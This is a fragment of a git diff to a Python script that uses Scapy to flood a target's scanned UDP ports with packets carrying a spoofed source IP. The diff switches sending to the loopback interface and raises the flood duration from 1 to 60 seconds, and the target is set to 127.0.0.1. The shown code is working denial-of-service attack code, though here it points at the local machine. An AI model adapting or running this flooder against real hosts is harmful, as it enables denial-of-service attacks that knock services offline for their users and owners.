@@ -40,8 +40,8 @@ def udpflood(target, target_ports, duration):
             pass
 
         #client.sendto(byts, (target, target_ports[p]))
-        pack = IP(src=source_ip, dst=target) / UDP(dport=ports[p]) / Raw(byts)
-        send(pack)
+        pack = IP(src=source_ip, dst=target) / UDP(dport=ports[p]) / Raw(load=byts)
+        send(pack, iface="lo0")
         sent = sent + 1
         p = p + 1
         if p == len(target_ports):
@@ -52,6 +52,6 @@ def udpflood(target, target_ports, duration):
 
 targ = "127.0.0.1"
 ports = scan_ports(targ)
-dur = 1
+dur = 60
 
 udpflood(targ, ports, dur)
